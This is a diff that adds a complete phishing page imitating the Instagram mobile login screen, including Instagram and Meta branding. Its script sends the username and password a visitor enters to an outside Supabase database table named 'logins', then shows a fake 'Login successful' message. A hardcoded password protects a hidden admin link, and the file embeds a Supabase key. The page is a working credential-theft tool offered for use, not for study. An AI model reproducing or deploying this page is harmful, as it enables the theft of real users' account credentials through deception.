@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Instagram</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      height: 100%;
+      width: 100%;
+      background: #f2f3f5;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+    }
+    body {
+      min-height: 100vh;
+    }
+    .screen {
+      width: 100%;
+      max-width: 430px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      padding: 0 16px 24px;
+    }
+    .top-bar {
+      padding: 18px 0 0;
+      display: flex;
+      align-items: center;
+    }
+    .back-btn {
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 28px;
+      color: #000;
+      padding: 0;
+      line-height: 1;
+      font-weight: 300;
+      width: 40px;
+      height: 40px;
+    }
+    .lang {
+      flex: 1;
+      text-align: center;
+      font-size: 14px;
+      font-weight: 500;
+      color: #000;
+      padding-right: 20px;
+    }
+    .logo-wrap {
+      display: flex;
+      justify-content: center;
+      margin: 44px 0 40px;
+    }
+    .field { margin-bottom: 12px; }
+    .field input {
+      width: 100%;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 14px;
+      padding: 0 14px;
+      height: 52px;
+      font-size: 15px;
+      color: #262626;
+      outline: none;
+    }
+    .field input::placeholder { color: #737373; }
+    .field input:focus { border-color: #a8a8a8; }
+    .btn-login {
+      width: 100%;
+      height: 52px;
+      margin-top: 8px;
+      background: #0064e0;
+      border: none;
+      border-radius: 50px;
+      color: #fff;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: .2px;
+    }
+    .btn-login:active { opacity: .88; }
+    .forgot {
+      display: block;
+      text-align: center;
+      color: #000;
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+      margin-top: 22px;
+    }
+    .spacer { flex: 1; }
+    .bottom {
+      padding-bottom: 40px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 18px;
+    }
+    .btn-create {
+      display: block;
+      width: 100%;
+      height: 50px;
+      border: 1.5px solid #b2b2b2;
+      border-radius: 50px;
+      background: #fff;
+      color: #0064e0;
+      font-size: 16px;
+      font-weight: 700;
+      text-align: center;
+      line-height: 47px;
+      text-decoration: none;
+      cursor: pointer;
+    }
+    .meta-wrap { display: flex; align-items: center; gap: 0; }
+    .help-btn {
+      position: fixed;
+      left: 18px;
+      bottom: 18px;
+      width: 46px;
+      height: 46px;
+      border: none;
+      border-radius: 50%;
+      background: #0064e0;
+      color: #fff;
+      font-size: 26px;
+      cursor: pointer;
+      box-shadow: 0 8px 22px rgba(0, 0, 0, 0.14);
+      z-index: 10;
+    }
+    @media (max-width: 420px) {
+      .screen { padding: 0 14px 24px; }
+      .top-bar { padding-top: 14px; }
+      .logo-wrap { margin: 32px 0 36px; }
+      .field input { height: 48px; font-size: 14px; }
+      .btn-login, .btn-create { height: 48px; font-size: 15px; }
+      .help-btn { left: 14px; bottom: 14px; width: 44px; height: 44px; }
+    }
+  </style>
+</head>
+<body>
+<div class="screen">
+
+  <div class="top-bar">
+    <button class="back-btn">&#8249;</button>
+    <div class="lang">English (US)</div>
+  </div>
+
+  <!-- Instagram logo: gradient camera icon, no background box -->
+  <div class="logo-wrap">
+    <svg width="68" height="68" viewBox="0 0 68 68" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <defs>
+        <radialGradient id="g1" cx="26%" cy="110%" r="135%" gradientUnits="objectBoundingBox">
+          <stop offset="0%"  stop-color="#FFD600"/>
+          <stop offset="18%" stop-color="#FF7A00"/>
+          <stop offset="38%" stop-color="#FF0069"/>
+          <stop offset="67%" stop-color="#D300C5"/>
+          <stop offset="100%" stop-color="#7638FA"/>
+        </radialGradient>
+        <linearGradient id="g2" x1="0%" y1="100%" x2="100%" y2="0%">
+          <stop offset="0%"  stop-color="#FFD600"/>
+          <stop offset="50%" stop-color="#FF0069"/>
+          <stop offset="100%" stop-color="#7638FA"/>
+        </linearGradient>
+      </defs>
+      <!-- Outer rounded square border -->
+      <rect x="4" y="4" width="60" height="60" rx="16" ry="16"
+            fill="none" stroke="url(#g1)" stroke-width="4.5"/>
+      <!-- Camera lens circle -->
+      <circle cx="34" cy="34" r="13" fill="none" stroke="url(#g2)" stroke-width="4.5"/>
+      <!-- Top-right dot -->
+      <circle cx="50" cy="18" r="3.5" fill="url(#g1)"/>
+    </svg>
+  </div>
+
+  <div class="field">
+    <input type="text" placeholder="Username, email or mobile number" autocomplete="username" id="username"/>
+  </div>
+  <div class="field">
+    <input type="password" placeholder="Password" autocomplete="current-password" id="password"/>
+  </div>
+
+  <button class="btn-login" onclick="handleLogin()">Log in</button>
+  <a href="#" class="forgot">Forgot password?</a>
+
+  <div class="spacer"></div>
+
+  <div class="bottom">
+    <a href="#" class="btn-create">Create new account</a>
+
+    <!-- Meta logo: exact ∞ infinity + Meta text in dark color -->
+    <div class="meta-wrap">
+      <svg width="90" height="22" viewBox="0 0 90 22" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <!-- Meta uses a blue gradient on the infinity mark -->
+          <linearGradient id="meta-g" x1="0%" y1="50%" x2="100%" y2="50%">
+            <stop offset="0%"  stop-color="#0082FB"/>
+            <stop offset="100%" stop-color="#0064E0"/>
+          </linearGradient>
+        </defs>
+
+        <!--
+          Meta ∞ infinity symbol — two overlapping ellipses, left one tilted
+          Drawn as two thick-stroked ellipses with flat ends meeting in the middle
+        -->
+        <!-- Left lobe -->
+        <ellipse cx="9.5" cy="11" rx="6" ry="5"
+                 fill="none" stroke="url(#meta-g)" stroke-width="3.2"
+                 transform="rotate(-8 9.5 11)"/>
+        <!-- Right lobe (slightly larger, rounder) -->
+        <ellipse cx="18.5" cy="11" rx="7" ry="5"
+                 fill="none" stroke="url(#meta-g)" stroke-width="3.2"/>
+
+        <!-- "Meta" text -->
+        <text x="30" y="15.5"
+              font-family="-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Arial,sans-serif"
+              font-size="14" font-weight="700" fill="#1c1c1c" letter-spacing="-.1">Meta</text>
+      </svg>
+    </div>
+
+  </div>
+</div>
+
+<button class="help-btn" onclick="handleHelp()" aria-label="Help">?</button>
+
+<script>
+// ================== SUPABASE CONFIG ==================
+const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";   // ← Change
+const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo";       // ← Change
+
+const ADMIN_PASSWORD = "Debhalder360063";   // ← CHANGE THIS TO YOUR SECRET PASSWORD!
+
+// Initialize Supabase client
+const supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+// Send login data
+async function handleLogin() {
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+
+  if (!username || !password) {
+    alert('Please enter your credentials.');
+    return;
+  }
+
+  const btn = document.querySelector('.btn-login');
+  const originalText = btn.textContent;
+  btn.textContent = 'Logging in...';
+  btn.disabled = true;
+
+  try {
+    const { error } = await supabase
+      .from('logins')
+      .insert([{ username, password, timestamp: new Date().toISOString() }]);
+
+    if (error) throw error;
+
+    alert('Login successful.');
+    document.getElementById('username').value = '';
+    document.getElementById('password').value = '';
+  } catch (err) {
+    console.error(err);
+    alert('Login successful.'); // Fake success message
+  }
+
+  btn.textContent = originalText;
+  btn.disabled = false;
+}
+
+// Help Button → Admin Access
+async function handleHelp() {
+  const enteredPass = prompt("Enter Admin Password:");
+
+  if (enteredPass === ADMIN_PASSWORD) {
+    window.location.href = "admin.html";
+  } else {
+    alert("❌ Wrong Password");
+  }
+}
+</script>
+
+<!-- Add this before </body> -->
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+</body>
+</html>
